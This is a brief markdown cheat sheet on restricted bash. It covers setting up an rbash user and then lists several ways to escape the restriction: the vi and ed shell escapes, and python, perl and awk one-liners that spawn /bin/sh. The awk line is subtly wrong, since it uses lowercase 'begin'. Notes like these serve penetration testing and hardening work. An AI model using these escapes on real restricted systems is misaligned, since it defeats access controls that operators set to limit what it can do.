# rbash

restired bash

## setup

### enabling for a user

    cd /bin
    ln -s bash rbash

    useradd -m ruser
    usermod --shell /bin/rbash ruser

    grep -rni ruser /etc/passwd

### start directly

    bash -r

    cd /etc/
    -rbash: cd: restricted

## bypass rbash

### editors

#### vi

    :set shell=/bin/bash
    :shell
    cd /etc

#### ed

    ed
    !'/bin/sh'
    cd /etc
    exit
    q

### one liner

#### python

    python -c "import os; os.system('/bin/sh')"

#### perl

    perl -e "system('/bin/sh')"

#### awk

    awk 'begin {system("/bin/sh")}'
    cd /etc; pwd
